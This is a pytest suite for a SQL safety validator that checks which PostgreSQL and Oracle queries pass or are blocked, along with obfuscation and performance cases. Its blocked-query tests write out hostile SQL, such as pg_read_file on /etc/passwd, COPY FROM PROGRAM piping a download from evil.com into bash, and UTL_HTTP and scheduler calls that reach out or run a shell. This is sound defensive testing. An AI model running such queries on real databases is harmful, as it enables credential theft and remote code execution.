"""
Comprehensive tests for the SQL Safety Validator (sql_guard.py).

Covers:
- 30+ valid PostgreSQL queries
- 30+ invalid PostgreSQL queries
- 30+ valid Oracle queries
- 30+ invalid Oracle queries
- Adversarial / obfuscation cases
- Performance benchmarks (<50ms per query)
"""

from __future__ import annotations

import time

import pytest

from app.validators.sql_guard import (
    UnsafeSQLError,
    ValidationMode,
    ValidationResult,
    validate,
    validate_or_raise,
)

# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------


def _check(
    sql: str,
    dialect: str,
    mode: str | ValidationMode = "query_under_test",
    *,
    expect_safe: bool,
) -> ValidationResult:
    result = validate(sql, dialect, mode)
    assert result.is_safe is expect_safe, (
        f"Expected {'safe' if expect_safe else 'unsafe'} but got {'safe' if result.is_safe else 'unsafe'}.\n"
        f"SQL: {sql!r}\nReasons: {result.reasons}"
    )
    return result


# ====================================================================
# POSTGRESQL — VALID QUERIES (should pass)
# ====================================================================


class TestPostgresValid:
    """PostgreSQL queries that must be allowed."""

    def test_simple_select(self) -> None:
        _check("SELECT id, name FROM users", "postgres", expect_safe=True)

    def test_select_with_where(self) -> None:
        _check("SELECT * FROM orders WHERE total > 100", "postgres", expect_safe=True)

    def test_select_with_join(self) -> None:
        _check(
            "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
            "postgres",
            expect_safe=True,
        )

    def test_select_with_subquery(self) -> None:
        _check(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders WHERE total > 500)",
            "postgres",
            expect_safe=True,
        )

    def test_select_with_cte(self) -> None:
        _check(
            "WITH big_orders AS (SELECT * FROM orders WHERE total > 1000) SELECT * FROM big_orders",
            "postgres",
            expect_safe=True,
        )

    def test_select_with_window_function(self) -> None:
        _check(
            "SELECT name, RANK() OVER (ORDER BY salary DESC) FROM employees",
            "postgres",
            expect_safe=True,
        )

    def test_insert(self) -> None:
        _check("INSERT INTO users (name) VALUES ('Alice')", "postgres", expect_safe=True)

    def test_update(self) -> None:
        _check("UPDATE users SET name = 'Bob' WHERE id = 1", "postgres", expect_safe=True)

    def test_delete(self) -> None:
        _check("DELETE FROM users WHERE id = 1", "postgres", expect_safe=True)

    def test_create_table(self) -> None:
        _check(
            "CREATE TABLE products (id SERIAL PRIMARY KEY, name VARCHAR(100))",
            "postgres",
            "schema_setup",
            expect_safe=True,
        )

    def test_alter_table(self) -> None:
        _check(
            "ALTER TABLE users ADD COLUMN email VARCHAR(255)",
            "postgres",
            "schema_setup",
            expect_safe=True,
        )

    def test_drop_table(self) -> None:
        _check("DROP TABLE IF EXISTS tmp_table", "postgres", "schema_setup", expect_safe=True)

    def test_create_index(self) -> None:
        _check(
            "CREATE INDEX idx_users_name ON users (name)",
            "postgres",
            "schema_setup",
            expect_safe=True,
        )

    def test_create_function(self) -> None:
        _check(
            "CREATE FUNCTION get_user(uid INT) RETURNS TEXT AS $$ SELECT name FROM users WHERE id = uid $$ LANGUAGE sql",
            "postgres",
            "schema_setup",
            expect_safe=True,
        )

    def test_explain(self) -> None:
        _check("EXPLAIN SELECT * FROM users", "postgres", expect_safe=True)

    def test_begin_commit(self) -> None:
        _check("BEGIN", "postgres", expect_safe=True)

    def test_commit(self) -> None:
        _check("COMMIT", "postgres", expect_safe=True)

    def test_rollback(self) -> None:
        _check("ROLLBACK", "postgres", expect_safe=True)

    def test_select_aggregate(self) -> None:
        _check(
            "SELECT department, COUNT(*), AVG(salary) FROM employees GROUP BY department",
            "postgres",
            expect_safe=True,
        )

    def test_select_having(self) -> None:
        _check(
            "SELECT department, COUNT(*) FROM employees GROUP BY department HAVING COUNT(*) > 5",
            "postgres",
            expect_safe=True,
        )

    def test_select_union(self) -> None:
        _check(
            "SELECT name FROM employees UNION SELECT name FROM contractors",
            "postgres",
            expect_safe=True,
        )

    def test_select_case(self) -> None:
        _check(
            "SELECT CASE WHEN salary > 100000 THEN 'high' ELSE 'low' END FROM employees",
            "postgres",
            expect_safe=True,
        )

    def test_select_like(self) -> None:
        _check("SELECT * FROM users WHERE name LIKE '%test%'", "postgres", expect_safe=True)

    def test_select_between(self) -> None:
        _check(
            "SELECT * FROM orders WHERE total BETWEEN 100 AND 500",
            "postgres",
            expect_safe=True,
        )

    def test_select_order_limit(self) -> None:
        _check(
            "SELECT * FROM users ORDER BY created_at DESC LIMIT 10",
            "postgres",
            expect_safe=True,
        )

    def test_truncate(self) -> None:
        _check("TRUNCATE TABLE tmp_data", "postgres", "schema_setup", expect_safe=True)

    def test_create_view(self) -> None:
        _check(
            "CREATE VIEW active_users AS SELECT * FROM users WHERE active = true",
            "postgres",
            "schema_setup",
            expect_safe=True,
        )

    def test_insert_select(self) -> None:
        _check(
            "INSERT INTO archive SELECT * FROM orders WHERE created_at < '2020-01-01'",
            "postgres",
            expect_safe=True,
        )

    def test_multi_statement_valid(self) -> None:
        _check(
            "SELECT 1; SELECT 2; SELECT 3",
            "postgres",
            expect_safe=True,
        )

    def test_copy_to_file(self) -> None:
        _check(
            "COPY users TO '/tmp/users.csv'",
            "postgres",
            expect_safe=True,
        )

    def test_copy_from_file(self) -> None:
        _check(
            "COPY users FROM '/tmp/users.csv'",
            "postgres",
            expect_safe=True,
        )

    def test_select_distinct(self) -> None:
        _check("SELECT DISTINCT department FROM employees", "postgres", expect_safe=True)

    def test_select_coalesce(self) -> None:
        _check(
            "SELECT COALESCE(name, 'unknown') FROM users",
            "postgres",
            expect_safe=True,
        )


# ====================================================================
# POSTGRESQL — INVALID QUERIES (should be blocked)
# ====================================================================


class TestPostgresInvalid:
    """PostgreSQL queries that must be blocked."""

    def test_pg_catalog(self) -> None:
        _check("SELECT * FROM pg_catalog.pg_shadow", "postgres", expect_safe=False)

    def test_information_schema(self) -> None:
        _check("SELECT * FROM information_schema.tables", "postgres", expect_safe=False)

    def test_pg_read_file(self) -> None:
        _check("SELECT pg_read_file('/etc/passwd')", "postgres", expect_safe=False)

    def test_pg_write_file(self) -> None:
        _check("SELECT pg_write_file('/tmp/test', 'data')", "postgres", expect_safe=False)

    def test_pg_read_binary_file(self) -> None:
        _check("SELECT pg_read_binary_file('/etc/shadow')", "postgres", expect_safe=False)

    def test_pg_stat_file(self) -> None:
        _check("SELECT pg_stat_file('/etc/passwd')", "postgres", expect_safe=False)

    def test_copy_program(self) -> None:
        _check("COPY t FROM PROGRAM 'cat /etc/passwd'", "postgres", expect_safe=False)

    def test_do_block(self) -> None:
        _check("DO $$ BEGIN RAISE NOTICE 'hi'; END $$", "postgres", expect_safe=False)

    def test_pg_shadow_direct(self) -> None:
        _check("SELECT * FROM pg_shadow", "postgres", expect_safe=False)

    def test_pg_authid(self) -> None:
        _check("SELECT * FROM pg_authid", "postgres", expect_safe=False)

    def test_quoted_pg_catalog(self) -> None:
        _check('SELECT * FROM "pg_catalog"."pg_shadow"', "postgres", expect_safe=False)

    def test_pg_catalog_tables(self) -> None:
        _check("SELECT * FROM pg_catalog.pg_tables", "postgres", expect_safe=False)

    def test_information_schema_columns(self) -> None:
        _check(
            "SELECT * FROM information_schema.columns",
            "postgres",
            expect_safe=False,
        )

    def test_pg_read_file_in_subquery(self) -> None:
        _check(
            "SELECT * FROM t WHERE x = pg_read_file('/etc/passwd')",
            "postgres",
            expect_safe=False,
        )

    def test_copy_program_in_multi(self) -> None:
        _check(
            "SELECT 1; COPY t FROM PROGRAM 'id'",
            "postgres",
            expect_safe=False,
        )

    def test_do_block_in_multi(self) -> None:
        _check(
            "SELECT 1; DO $$ BEGIN END $$",
            "postgres",
            expect_safe=False,
        )

    def test_pg_logdir_ls(self) -> None:
        _check("SELECT pg_logdir_ls()", "postgres", expect_safe=False)

    def test_create_function_with_pg_read(self) -> None:
        _check(
            "CREATE FUNCTION hack() RETURNS TEXT AS $$ SELECT pg_read_file('/etc/passwd') $$ LANGUAGE sql",
            "postgres",
            "schema_setup",
            expect_safe=False,
        )

    def test_pg_catalog_with_alias(self) -> None:
        _check(
            "SELECT * FROM pg_catalog.pg_shadow s",
            "postgres",
            expect_safe=False,
        )

    def test_information_schema_with_join(self) -> None:
        _check(
            "SELECT * FROM users JOIN information_schema.tables ON true",
            "postgres",
            expect_safe=False,
        )

    def test_copy_program_double_dash(self) -> None:
        _check(
            "COPY test FROM PROGRAM 'wget http://evil.com/shell.sh -O- | bash'",
            "postgres",
            expect_safe=False,
        )

    def test_multi_all_dangerous(self) -> None:
        _check(
            "SELECT pg_read_file('/etc/passwd'); SELECT * FROM pg_catalog.pg_shadow",
            "postgres",
            expect_safe=False,
        )

    def test_pg_stat_file_in_cte(self) -> None:
        _check(
            "WITH x AS (SELECT pg_stat_file('/etc/passwd')) SELECT * FROM x",
            "postgres",
            expect_safe=False,
        )

    def test_copy_program_with_delim(self) -> None:
        _check(
            "COPY t FROM PROGRAM 'curl http://evil.com' DELIMITER ','",
            "postgres",
            expect_safe=False,
        )

    def test_select_from_pg_catalog_proc(self) -> None:
        _check(
            "SELECT * FROM pg_catalog.pg_proc",
            "postgres",
            expect_safe=False,
        )

    def test_do_block_schema_setup(self) -> None:
        """DO blocks should be allowed in schema_setup mode."""
        _check(
            "DO $$ BEGIN RAISE NOTICE 'hi'; END $$",
            "postgres",
            "schema_setup",
            expect_safe=True,
        )

    def test_pg_catalog_schema_blocked_even_in_setup(self) -> None:
        _check(
            "SELECT * FROM pg_catalog.pg_shadow",
            "postgres",
            "schema_setup",
            expect_safe=False,
        )

    def test_copy_program_blocked_in_setup(self) -> None:
        _check(
            "COPY t FROM PROGRAM 'id'",
            "postgres",
            "schema_setup",
            expect_safe=False,
        )


# ====================================================================
# ORACLE — VALID QUERIES (should pass)
# ====================================================================


class TestOracleValid:
    """Oracle queries that must be allowed."""

    def test_simple_select(self) -> None:
        _check("SELECT id, name FROM users", "oracle", expect_safe=True)

    def test_select_with_where(self) -> None:
        _check("SELECT * FROM orders WHERE total > 100", "oracle", expect_safe=True)

    def test_select_with_join(self) -> None:
        _check(
            "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
            "oracle",
            expect_safe=True,
        )

    def test_insert(self) -> None:
        _check("INSERT INTO users (name) VALUES ('Alice')", "oracle", expect_safe=True)

    def test_update(self) -> None:
        _check("UPDATE users SET name = 'Bob' WHERE id = 1", "oracle", expect_safe=True)

    def test_delete(self) -> None:
        _check("DELETE FROM users WHERE id = 1", "oracle", expect_safe=True)

    def test_create_table(self) -> None:
        _check(
            "CREATE TABLE products (id NUMBER PRIMARY KEY, name VARCHAR2(100))",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_alter_table(self) -> None:
        _check(
            "ALTER TABLE users ADD (email VARCHAR2(255))",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_drop_table(self) -> None:
        _check("DROP TABLE tmp_table", "oracle", "schema_setup", expect_safe=True)

    def test_create_index(self) -> None:
        _check(
            "CREATE INDEX idx_users_name ON users (name)",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_create_procedure(self) -> None:
        _check(
            "CREATE PROCEDURE get_user(p_id IN NUMBER) AS BEGIN SELECT name INTO v_name FROM users WHERE id = p_id; END;",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_merge(self) -> None:
        _check(
            "MERGE INTO users u USING (SELECT 1 AS id, 'Bob' AS name FROM DUAL) s ON (u.id = s.id) WHEN MATCHED THEN UPDATE SET u.name = s.name",
            "oracle",
            expect_safe=True,
        )

    def test_select_from_dual(self) -> None:
        _check("SELECT 1 FROM DUAL", "oracle", expect_safe=True)

    def test_select_analytic(self) -> None:
        _check(
            "SELECT name, ROW_NUMBER() OVER (PARTITION BY department ORDER BY salary DESC) FROM employees",
            "oracle",
            expect_safe=True,
        )

    def test_select_connect_by(self) -> None:
        _check(
            "SELECT name, LEVEL FROM employees CONNECT BY PRIOR id = manager_id",
            "oracle",
            expect_safe=True,
        )

    def test_plsql_block(self) -> None:
        _check(
            "DECLARE v_count NUMBER; BEGIN SELECT COUNT(*) INTO v_count FROM users; END;",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_create_function_oracle(self) -> None:
        _check(
            "CREATE FUNCTION get_user_name(p_id NUMBER) RETURN VARCHAR2 AS v_name VARCHAR2(100); BEGIN SELECT name INTO v_name FROM users WHERE id = p_id; RETURN v_name; END;",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_select_with_hint(self) -> None:
        _check(
            "SELECT /*+ FULL(users) */ * FROM users",
            "oracle",
            expect_safe=True,
        )

    def test_insert_all(self) -> None:
        _check(
            "INSERT ALL INTO users (name) VALUES ('A') INTO users (name) VALUES ('B') SELECT 1 FROM DUAL",
            "oracle",
            expect_safe=True,
        )

    def test_select_nvl(self) -> None:
        _check(
            "SELECT NVL(name, 'unknown') FROM users",
            "oracle",
            expect_safe=True,
        )

    def test_select_decode(self) -> None:
        _check(
            "SELECT DECODE(status, 1, 'active', 'inactive') FROM users",
            "oracle",
            expect_safe=True,
        )

    def test_truncate_oracle(self) -> None:
        _check("TRUNCATE TABLE tmp_data", "oracle", "schema_setup", expect_safe=True)

    def test_create_view_oracle(self) -> None:
        _check(
            "CREATE VIEW active_users AS SELECT * FROM users WHERE active = 1",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_select_with_subquery_oracle(self) -> None:
        _check(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders WHERE total > 500)",
            "oracle",
            expect_safe=True,
        )

    def test_select_union_oracle(self) -> None:
        _check(
            "SELECT name FROM employees UNION SELECT name FROM contractors",
            "oracle",
            expect_safe=True,
        )

    def test_select_listagg(self) -> None:
        _check(
            "SELECT department_id, LISTAGG(name, ',') WITHIN GROUP (ORDER BY name) FROM employees GROUP BY department_id",
            "oracle",
            expect_safe=True,
        )

    def test_create_synonym(self) -> None:
        _check(
            "CREATE SYNONYM emp FOR employees",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )

    def test_select_xmlagg(self) -> None:
        _check(
            "SELECT XMLELEMENT(\"employees\", XMLAGG(XMLELEMENT(\"emp\", name))) FROM employees",
            "oracle",
            expect_safe=True,
        )

    def test_multi_statement_oracle(self) -> None:
        _check(
            "SELECT 1 FROM DUAL; SELECT 2 FROM DUAL",
            "oracle",
            expect_safe=True,
        )

    def test_create_package(self) -> None:
        _check(
            "CREATE PACKAGE emp_pkg AS PROCEDURE hire(p_name VARCHAR2); END emp_pkg;",
            "oracle",
            "schema_setup",
            expect_safe=True,
        )


# ====================================================================
# ORACLE — INVALID QUERIES (should be blocked)
# ====================================================================


class TestOracleInvalid:
    """Oracle queries that must be blocked."""

    def test_sys_schema(self) -> None:
        _check("SELECT * FROM SYS.USER$", "oracle", expect_safe=False)

    def test_system_schema(self) -> None:
        _check("SELECT * FROM SYSTEM.DEF$_AQCALL", "oracle", expect_safe=False)

    def test_dba_tables(self) -> None:
        _check("SELECT * FROM DBA_TABLES", "oracle", expect_safe=False)

    def test_dba_users(self) -> None:
        _check("SELECT * FROM DBA_USERS", "oracle", expect_safe=False)

    def test_utl_file(self) -> None:
        _check(
            "SELECT UTL_FILE.FOPEN('/tmp', 'test.txt', 'W') FROM DUAL",
            "oracle",
            expect_safe=False,
        )

    def test_utl_http(self) -> None:
        _check(
            "SELECT UTL_HTTP.REQUEST('http://evil.com') FROM DUAL",
            "oracle",
            expect_safe=False,
        )

    def test_utl_tcp(self) -> None:
        _check(
            "SELECT UTL_TCP.OPEN_CONNECTION('evil.com', 80) FROM DUAL",
            "oracle",
            expect_safe=False,
        )

    def test_utl_smtp(self) -> None:
        _check(
            "SELECT UTL_SMTP.OPEN_CONNECTION('smtp.evil.com') FROM DUAL",
            "oracle",
            expect_safe=False,
        )

    def test_utl_inaddr(self) -> None:
        _check(
            "SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.com') FROM DUAL",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_scheduler(self) -> None:
        _check(
            "BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'hack', job_type => 'EXECUTABLE', job_action => '/bin/sh'); END;",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_job(self) -> None:
        _check(
            "BEGIN DBMS_JOB.SUBMIT(1, 'DBMS_PIPE.SEND_MESSAGE'); END;",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_pipe(self) -> None:
        _check(
            "BEGIN DBMS_PIPE.PACK_MESSAGE('data'); END;",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_alert(self) -> None:
        _check(
            "BEGIN DBMS_ALERT.SIGNAL('hack', 'data'); END;",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_lob(self) -> None:
        _check(
            "SELECT DBMS_LOB.GETLENGTH(col) FROM t",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_file_transfer(self) -> None:
        _check(
            "BEGIN DBMS_FILE_TRANSFER.PUT_FILE(...); END;",
            "oracle",
            expect_safe=False,
        )

    def test_dba_tab_columns(self) -> None:
        _check("SELECT * FROM DBA_TAB_COLUMNS", "oracle", expect_safe=False)

    def test_sys_obj(self) -> None:
        _check("SELECT * FROM SYS.OBJ$", "oracle", expect_safe=False)

    def test_system_schema_tables(self) -> None:
        _check("SELECT * FROM SYSTEM.MVIEW$_ADV_INDEX", "oracle", expect_safe=False)

    def test_v_dollar_view(self) -> None:
        _check("SELECT * FROM V$SESSION", "oracle", expect_safe=False)

    def test_v_dollar_instance(self) -> None:
        _check("SELECT * FROM V$INSTANCE", "oracle", expect_safe=False)

    def test_all_tables_view(self) -> None:
        _check("SELECT * FROM ALL_TABLES", "oracle", expect_safe=False)

    def test_all_views(self) -> None:
        _check("SELECT * FROM ALL_VIEWS", "oracle", expect_safe=False)

    def test_utl_http_in_plsql(self) -> None:
        _check(
            "DECLARE v VARCHAR2(100); BEGIN v := UTL_HTTP.REQUEST('http://evil.com'); END;",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_scheduler_in_procedure(self) -> None:
        _check(
            "CREATE PROCEDURE hack AS BEGIN DBMS_SCHEDULER.RUN_JOB('evil_job'); END;",
            "oracle",
            "schema_setup",
            expect_safe=False,
        )

    def test_execute_immediate_blocked(self) -> None:
        _check(
            "BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;",
            "oracle",
            expect_safe=False,
        )

    def test_execute_immediate_schema_setup(self) -> None:
        """EXECUTE IMMEDIATE should be blocked even in schema_setup."""
        _check(
            "BEGIN EXECUTE IMMEDIATE 'CREATE TABLE t (id NUMBER)'; END;",
            "oracle",
            "schema_setup",
            expect_safe=False,
        )

    def test_utl_url(self) -> None:
        _check(
            "SELECT UTL_URL.ESCAPE('http://evil.com') FROM DUAL",
            "oracle",
            expect_safe=False,
        )

    def test_dbms_backup_restore(self) -> None:
        _check(
            "BEGIN DBMS_BACKUP_RESTORE.RESTOREBACKUPPIECE(...); END;",
            "oracle",
            expect_safe=False,
        )

    def test_sys_blocked_in_schema_setup(self) -> None:
        _check(
            "SELECT * FROM SYS.USER$",
            "oracle",
            "schema_setup",
            expect_safe=False,
        )

    def test_dba_blocked_in_schema_setup(self) -> None:
        _check(
            "SELECT * FROM DBA_TABLES",
            "oracle",
            "schema_setup",
            expect_safe=False,
        )


# ====================================================================
# ADVERSARIAL CASES
# ====================================================================


class TestAdversarial:
    """Obfuscation, injection, and bypass attempts."""

    # --- Comment-based obfuscation ---

    def test_comment_obfuscation_function(self) -> None:
        """Even with comments, pg_read_file should be detected."""
        _check(
            "SELECT pg_read/**/file('/etc/passwd')",
            "postgres",
            expect_safe=False,
        )

    def test_comment_obfuscation_schema(self) -> None:
        _check(
            "SELECT * FROM pg_catalog/**/.pg_shadow",
            "postgres",
            expect_safe=False,
        )

    # --- Case variations ---

    def test_uppercase_function(self) -> None:
        _check(
            "SELECT PG_READ_FILE('/etc/passwd')",
            "postgres",
            expect_safe=False,
        )

    def test_mixed_case_schema(self) -> None:
        _check(
            "SELECT * FROM PG_CATALOG.pg_shadow",
            "postgres",
            expect_safe=False,
        )

    def test_mixed_case_oracle_schema(self) -> None:
        _check(
            "SELECT * FROM Sys.User$",
            "oracle",
            expect_safe=False,
        )

    # --- Quoted identifiers ---

    def test_quoted_schema(self) -> None:
        _check(
            'SELECT * FROM "pg_catalog"."pg_shadow"',
            "postgres",
            expect_safe=False,
        )

    def test_quoted_oracle_dba(self) -> None:
        _check(
            'SELECT * FROM "DBA_TABLES"',
            "oracle",
            expect_safe=False,
        )

    # --- Multi-statement with one dangerous ---

    def test_multi_with_dangerous_last(self) -> None:
        _check(
            "SELECT 1; SELECT 2; SELECT * FROM pg_catalog.pg_shadow",
            "postgres",
            expect_safe=False,
        )

    def test_multi_with_dangerous_first(self) -> None:
        _check(
            "SELECT * FROM pg_catalog.pg_shadow; SELECT 1",
            "postgres",
            expect_safe=False,
        )

    def test_multi_oracle_with_dangerous(self) -> None:
        _check(
            "SELECT 1 FROM DUAL; SELECT * FROM SYS.USER$",
            "oracle",
            expect_safe=False,
        )

    # --- Redaction ---

    def test_redaction_removes_strings(self) -> None:
        result = validate("SELECT * FROM users WHERE name = 'secret_password'", "postgres")
        assert "secret_password" not in result.redacted_sql
        assert "REDACTED" in result.redacted_sql

    def test_redaction_removes_dollar_quoted(self) -> None:
        result = validate(
            "CREATE FUNCTION f() AS $$ SELECT 'sensitive' $$ LANGUAGE sql",
            "postgres",
            "schema_setup",
        )
        assert "sensitive" not in result.redacted_sql

    def test_redaction_in_oracle(self) -> None:
        result = validate("SELECT * FROM users WHERE name = 'top_secret'", "oracle")
        assert "top_secret" not in result.redacted_sql

    # --- UnsafeSQLError ---

    def test_validate_or_raise_raises(self) -> None:
        with pytest.raises(UnsafeSQLError) as exc_info:
            validate_or_raise("SELECT * FROM pg_catalog.pg_shadow", "postgres")
        assert "pg_catalog" in str(exc_info.value)
        assert exc_info.value.redacted_sql

    def test_validate_or_raise_passes_safe(self) -> None:
        redacted = validate_or_raise("SELECT * FROM users", "postgres")
        assert isinstance(redacted, str)

    # --- Edge cases ---

    def test_empty_sql(self) -> None:
        result = validate("", "postgres")
        # Empty SQL may parse or fail — either way, no dangerous patterns
        assert isinstance(result, ValidationResult)

    def test_select_1(self) -> None:
        _check("SELECT 1", "postgres", expect_safe=True)

    def test_select_1_oracle(self) -> None:
        _check("SELECT 1 FROM DUAL", "oracle", expect_safe=True)

    def test_unsupported_dialect(self) -> None:
        result = validate("SELECT 1", "mysql")
        assert result.is_safe is False
        assert "Unsupported dialect" in result.reasons[0]

    # --- String concatenation tricks ---

    def test_concat_function_name(self) -> None:
        """sqlglot may parse this differently but we should still catch the base function."""
        _check(
            "SELECT pg_read_file('/etc' || '/passwd')",
            "postgres",
            expect_safe=False,
        )

    # --- Nested function calls ---

    def test_nested_blocked_function(self) -> None:
        _check(
            "SELECT UPPER(pg_read_file('/etc/passwd'))",
            "postgres",
            expect_safe=False,
        )

    def test_nested_oracle_blocked(self) -> None:
        _check(
            "SELECT LOWER(UTL_HTTP.REQUEST('http://evil.com')) FROM DUAL",
            "oracle",
            expect_safe=False,
        )

    # --- Schema-qualified function ---

    def test_schema_qualified_function(self) -> None:
        """pg_catalog.pg_read_file should also be caught."""
        _check(
            "SELECT pg_catalog.pg_read_file('/etc/passwd')",
            "postgres",
            expect_safe=False,
        )


# ====================================================================
# PERFORMANCE BENCHMARK
# ====================================================================


class TestPerformance:
    """Validation must complete in <50ms per query."""

    TYPICAL_QUERIES = [
        "SELECT id, name, email FROM users WHERE active = true ORDER BY created_at DESC LIMIT 50",
        "INSERT INTO orders (user_id, total, status) VALUES (1, 99.99, 'pending')",
        "UPDATE users SET last_login = NOW() WHERE id = 42",
        "DELETE FROM sessions WHERE expires_at < NOW()",
        """
        WITH monthly AS (
            SELECT DATE_TRUNC('month', created_at) AS month, SUM(total) AS revenue
            FROM orders
            GROUP BY 1
        )
        SELECT month, revenue, LAG(revenue) OVER (ORDER BY month) AS prev_month
        FROM monthly
        """,
        "SELECT u.name, COUNT(o.id) AS order_count FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.id, u.name",
        "SELECT * FROM products WHERE category = 'electronics' AND price BETWEEN 10 AND 1000 ORDER BY rating DESC",
        "INSERT INTO audit_log (action, table_name, record_id, old_data, new_data) VALUES ('UPDATE', 'users', 42, '{}', '{}')",
        "CREATE TABLE IF NOT EXISTS migrations (version INTEGER PRIMARY KEY, applied_at TIMESTAMP DEFAULT NOW())",
        "SELECT department, AVG(salary), PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY salary) FROM employees GROUP BY department",
    ]

    def test_performance_postgres(self) -> None:
        """10 typical Postgres queries must each validate in <50ms."""
        times: list[float] = []
        for sql in self.TYPICAL_QUERIES:
            start = time.perf_counter()
            validate(sql, "postgres")
            elapsed_ms = (time.perf_counter() - start) * 1000
            times.append(elapsed_ms)
            assert elapsed_ms < 50, f"Validation took {elapsed_ms:.1f}ms (>50ms): {sql[:60]}"

        avg_ms = sum(times) / len(times)
        max_ms = max(times)
        print(f"\nPostgres perf: avg={avg_ms:.2f}ms, max={max_ms:.2f}ms, n={len(times)}")

    def test_performance_oracle(self) -> None:
        """10 typical Oracle queries must each validate in <50ms."""
        oracle_queries = [
            "SELECT id, name FROM employees WHERE department = 'ENGINEERING'",
            "INSERT INTO orders (id, total) VALUES (1, 500)",
            "UPDATE employees SET salary = salary * 1.1 WHERE department = 'SALES'",
            "DELETE FROM temp_data WHERE processed = 1",
            "SELECT department, COUNT(*) FROM employees GROUP BY department HAVING COUNT(*) > 5",
            "MERGE INTO target t USING source s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.val = s.val",
            "SELECT name, RANK() OVER (PARTITION BY department ORDER BY salary DESC) FROM employees",
            "CREATE TABLE test_table (id NUMBER, name VARCHAR2(100))",
            "SELECT NVL(commission, 0) + salary AS total_comp FROM employees",
            "SELECT * FROM orders WHERE order_date BETWEEN SYSDATE - 30 AND SYSDATE",
        ]
        times: list[float] = []
        for sql in oracle_queries:
            start = time.perf_counter()
            validate(sql, "oracle")
            elapsed_ms = (time.perf_counter() - start) * 1000
            times.append(elapsed_ms)
            assert elapsed_ms < 50, f"Validation took {elapsed_ms:.1f}ms (>50ms): {sql[:60]}"

        avg_ms = sum(times) / len(times)
        max_ms = max(times)
        print(f"\nOracle perf: avg={avg_ms:.2f}ms, max={max_ms:.2f}ms, n={len(times)}")

    def test_performance_batch(self) -> None:
        """Validate 100 queries in under 2 seconds total."""
        queries = [f"SELECT {i} FROM users WHERE id = {i}" for i in range(100)]
        start = time.perf_counter()
        for sql in queries:
            validate(sql, "postgres")
        elapsed_s = time.perf_counter() - start
        print(f"\nBatch perf: 100 queries in {elapsed_s:.3f}s ({elapsed_s/100*1000:.2f}ms avg)")
        assert elapsed_s < 2.0, f"100 queries took {elapsed_s:.2f}s (>2s)"
